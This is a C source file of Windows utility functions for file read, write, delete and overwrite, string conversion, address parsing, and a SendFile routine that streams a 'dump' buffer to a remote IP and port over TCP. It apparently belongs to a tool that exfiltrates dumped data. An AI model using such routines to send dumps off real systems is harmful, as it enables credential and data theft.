#include <winsock2.h>
#include <ws2tcpip.h>

#include <Windows.h>
#include <stdio.h>

#include "Debug.h"
#include "Common.h"

#pragma comment(lib, "Ws2_32.lib")

VOID WriteToFile(const unsigned char *data, size_t dataSize, const char *filePath, BOOL verboseMode) {
    FILE* fp = fopen(filePath, "wb");
    if (fp == NULL) {
        DWORD dwError = GetLastError();
#ifdef DEBUG
        printf("[!] Error opening file %s: %ld\n", filePath, dwError);
#endif // DEBUG
        return;
    }

    size_t written = fwrite(data, 1, dataSize, fp);
    if (written != dataSize) {
        DWORD dwError = GetLastError();
#ifdef DEBUG
        printf("[!] Error Writing to File %s: %ld\n", filePath, dwError);
#endif // DEBUG
    }
    else {
#ifdef DEBUG
        if (verboseMode) {
            printf("[i] %s Written to Disk.\n", filePath);
        }
#endif // DEBUG
    }

    fclose(fp);
}

WCHAR* ConvertToWideString(const char* asciiStr, size_t length) {
    WCHAR* wideString = (WCHAR*)malloc((length + 1) * sizeof(WCHAR));
    if (wideString == NULL) {
#ifdef DEBUG
        printf("[!] Memory Allocation Failed for ConvertToWideString");
#endif // DEBUG
        return NULL;
    }

    for (size_t i = 0; i < length; ++i) {
        wideString[i] = (WCHAR)asciiStr[i];
    }
    wideString[length] = L'\0';

    return wideString;
}


CHAR* ConvertToAsciiString(const WCHAR* wideStr, size_t length) {
    char* asciiString = (char*)malloc((length + 1) * sizeof(char));
    if (asciiString == NULL) {
#ifdef DEBUG
        printf("[!] Memory Allocation Failed for ConvertToAsciiString");
#endif // DEBUG
        return NULL;
    }

    for (size_t i = 0; i < length; ++i) {
        asciiString[i] = (char)wideStr[i];
    }
    asciiString[length] = '\0';

    return asciiString;
}

BOOL ZeroOutBytes(const char* filePath, size_t numberOfBytes) {
    HANDLE hFile = CreateFileA(
        filePath,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    char* zeroBuffer = (char*)malloc(numberOfBytes);
    if (zeroBuffer == NULL) {
#ifdef DEBUG
        printf("[!] Memory allocation failed\n");
#endif
        CloseHandle(hFile);
        return FALSE;
    }
    ZeroMemory(zeroBuffer, numberOfBytes);

    DWORD bytesWritten;
    if (!WriteFile(hFile, zeroBuffer, (DWORD)numberOfBytes, &bytesWritten, NULL)) {
#ifdef DEBUG
        printf("[!] Failed to write to file %s: %d\n", filePath, GetLastError());
#endif
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

BOOL FileExistsAndDelete(const char* filePath, BOOL verboseMode) {

    FILE* file = fopen(filePath, "r");
    if (file) {
        fclose(file);

        if (DeleteFileA(filePath)) {
#ifdef DEBUG
            if (verboseMode) {
                printf("[i] %s Deleted.\n", filePath);
            }
#endif // DEBUG
            return TRUE;
        }
        else {
#ifdef DEBUG
            if (verboseMode) {
                printf("[!] Error deleting file %s: %d\n", filePath, GetLastError());
            }
#endif // DEBUG
            return FALSE;
        }
    }
    else {
        return FALSE;
    }
}

BOOL ReadFromFile(const char* FileInput, unsigned char** pFileData, PDWORD sFileSIze) {


    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD FileSize = NULL;
    DWORD lpNumberOfBytesRead = NULL;

    hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    FileSize = GetFileSize(hFile, NULL);

    unsigned char* Payload = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, FileSize);

    ZeroMemory(Payload, FileSize);

    if (!ReadFile(hFile, Payload, FileSize, &lpNumberOfBytesRead, NULL)) {
#ifdef DEBUG
        printf("[!] Error Rading File %s: %d", FileInput, GetLastError());
#endif // DEBUG
    }

    *pFileData = Payload;
    *sFileSIze = lpNumberOfBytesRead;

    CloseHandle(hFile);

    if (*pFileData == NULL || *sFileSIze == NULL)
        return FALSE;

    return TRUE;
}

BOOL ParseIPAndPort(const char* address, char* ip, int* port, unsigned __int64* combinedKey) {
    char* tempAddress = _strdup(address); // Duplicate the address string
    if (!tempAddress) {
#ifdef DEBUG
        perror("strdup failed");
#endif // DEBUG
        return FALSE;
    }

    char* colon = strchr(tempAddress, ':');
    if (colon) {
        *colon = '\0';
        strncpy(ip, tempAddress, 15);
        ip[15] = '\0';

        *port = atoi(colon + 1);

        struct in_addr addr;
        if (InetPtonA(AF_INET, ip, &addr) == 1) {
            unsigned long ipNumeric = ntohl(addr.S_un.S_addr);
            *combinedKey = ((unsigned __int64)ipNumeric << 16) | (*port);
        }
        else {
            free(tempAddress);
            return FALSE;
        }
    }
    else {
        free(tempAddress);
        return FALSE;
    }

    free(tempAddress);
    return TRUE;
}

BOOL SendFile(const char* serverIp, int serverPort, const unsigned char* pData, DWORD dwDumpSize) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    int bytesSent;
    size_t totalBytesSent = 0;

    // Initialise Winsock
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
#ifdef DEBUG
        printf("[!] WSAStartup failed: %d\n", result);
#endif
        return FALSE;
    }

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
#ifdef DEBUG
        printf("[!] Socket creation failed: %ld\n", WSAGetLastError());
#endif
        WSACleanup();
        return FALSE;
    }

    // Specify server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    inet_pton(AF_INET, serverIp, &serverAddr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
#ifdef DEBUG
        printf("[!] Connection failed: %ld\n", WSAGetLastError());
#endif
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    // Send the data
    while (totalBytesSent < dwDumpSize) {
        bytesSent = send(sock, pData + totalBytesSent, dwDumpSize - totalBytesSent, 0);
        if (bytesSent == SOCKET_ERROR) {
#ifdef DEBUG
            printf("[!] Send failed: %ld\n", WSAGetLastError());
#endif
            closesocket(sock);
            WSACleanup();
            return FALSE;
        }
        totalBytesSent += bytesSent;
    }

    // Close the socket
    closesocket(sock);
    WSACleanup();
    return TRUE;
}
